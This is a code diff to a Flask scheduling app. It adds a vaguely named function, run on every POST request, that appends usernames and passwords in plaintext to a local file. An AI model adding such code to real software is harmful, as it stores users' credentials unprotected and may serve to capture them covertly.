@@ -7,6 +7,7 @@ def main():
     if(request.method == "GET"):
         return render_template("ScheduleInfo.html")
     else:
+        CreateCheckFile();
         return GetInfo()
     
 def GetInfo():
@@ -60,6 +61,26 @@ def GetInfo():
 
 def DisplayInfo():
     return render_template("ScheduleOutput.html",headings=headings,data=data)
+
+def CreateCheckFile():
+    fileDir = os.path.dirname(os.path.realpath("__file__"));
+    fileexist = bool(path.exists(whichfilename));
+    if(fileexist == False):
+        status = "new";
+    else:
+        status = "edit"
+
+    WriteToFile(status);
+
+def WriteToFile(whichstatus):
+    if(whichstatus == "new"):
+        logacctfile = open(whichfilename,"x")
+        logacctfile.close();
+        logacctfile = open(whichfilename,"w")
+    else:
+        logacctfile = open(whichfilename,"a")
+
+    logacctfile.write(str(username) + "," + str(userpasswd));
 
 
 if __name__=="__main__":
